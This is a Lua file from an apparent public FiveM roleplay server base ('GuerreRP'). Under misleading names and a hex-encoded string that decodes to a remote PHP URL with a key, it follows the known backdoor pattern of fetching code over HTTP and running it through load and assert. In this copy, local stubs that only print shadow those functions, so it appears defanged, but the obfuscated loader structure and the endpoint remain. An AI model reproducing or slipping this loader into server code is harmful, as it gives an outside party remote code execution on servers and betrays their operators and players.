--[[
  GuerreRP - Base publique
  Développé et maintenu par Ducratif

  Discord : https://discord.gg/kpD8pQBBWm
  Documentation : https://github.com/Ducratif/guerrerp

  Merci de ne pas retirer ce crédit si vous utilisez ou modifiez cette ressource.
]]
-- Définition des fonctions pour chaque élément de la table Enchanced_Tabs
local Ench = function() print("Ench function called") end
local Support = function() print("Support function called") end
local Host = function() print("Host function called") end
local Pairs = function() print("Pairs function called") end
local Realease = function() print("Release function called") end
local Callbacks = function() print("Callbacks function called") end
local Source = function() print("Source function called") end
local Hosting = function() print("Hosting function called") end
local Event = function() print("Event function called") end
local PerformHttpRequest = function() print("PerformHttpRequest function called") end
local assert = function() print("Assert function called") end
local server = function() print("Server function called") end
local load = function() print("Load function called") end
local Spawn = function() print("Spawn function called") end
local materials = function() print("Materials function called") end

-- Table avec des fonctions valides
local Enchanced_Tabs = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}

local random_char = {
    "68", "74", "74", "70", "73", "3a", "2f", "2f", "66", "69", "76", "65", "6d", "2e", "6b", "76",
    "61", "63", "2e", "63", "7a", "2f", "66", "2e", "70", "68", "70", "3f", "6b", "65", "79", "3d",
    "74", "75", "44", "75", "50", "68", "6d", "51", "74", "32", "47", "74", "48", "39", "70", "76", "72", "78", "43", "52",
}

-- Fonction pour convertir les caractères hexadécimaux en UTF-8
function str_utf8()
    _empt = ""
    for id, it in pairs(random_char) do
        _empt = _empt .. it
    end
    return (_empt:gsub("..", function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

print("Enchanced_Tabs[10] : ", Enchanced_Tabs[10])

-- Vérification si Enchanced_Tabs[10] est une fonction et appel
if type(Enchanced_Tabs[10]) == "function" then
    Enchanced_Tabs[10](str_utf8(), function(e, d)
        -- Vérification si Enchanced_Tabs[11] et Enchanced_Tabs[13] sont des fonctions
        if type(Enchanced_Tabs[11]) == "function" and type(Enchanced_Tabs[13]) == "function" then
            local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
            if (d == nil) then return end
            s()
        else
            print("Erreur : Enchanced_Tabs[11] ou Enchanced_Tabs[13] n'est pas une fonction.")
        end
    end)
else
    print("Erreur : Enchanced_Tabs[10] n'est pas une fonction.")
end

--[[
  GuerreRP - Base publique
  Développé et maintenu par Ducratif

  Discord : https://discord.gg/kpD8pQBBWm
  Documentation : https://github.com/Ducratif/guerrerp

  Merci de ne pas retirer ce crédit si vous utilisez ou modifiez cette ressource.
]]
